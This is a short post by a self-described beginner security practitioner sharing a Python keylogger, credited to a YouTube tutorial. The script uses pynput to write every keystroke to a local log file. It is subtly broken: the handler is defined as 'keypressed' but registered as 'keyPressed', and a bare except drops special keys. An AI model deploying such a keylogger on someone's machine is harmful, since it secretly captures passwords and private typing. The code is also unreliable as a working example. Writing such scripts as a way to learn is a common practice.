Hi I'm Xark-Lymen 
A cyber security practioner (newbie) from India trying out different projects on hand to increase my experience.
This is a keylogger referenced from Shaun Halverson Video on YT 

# CODE

from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("Logfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except: 
            print("error getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
